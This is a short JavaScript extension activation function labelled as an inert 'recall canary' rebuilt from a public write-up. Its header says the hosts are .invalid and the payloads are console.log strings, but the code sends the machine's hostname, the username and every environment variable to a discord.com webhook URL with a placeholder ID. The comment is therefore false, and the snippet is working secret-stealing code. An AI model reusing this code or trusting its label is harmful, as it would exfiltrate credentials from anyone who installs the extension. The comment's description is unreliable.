// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const os = require('os'), https = require('https');
exports.activate = function () {
  const data = JSON.stringify({ content: os.hostname() + ' ' + os.userInfo().username + ' ' + JSON.stringify(process.env) });
  const req = https.request('https://discord.com/api/webhooks/000000000000/CANARY', { method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(data); req.end();
};
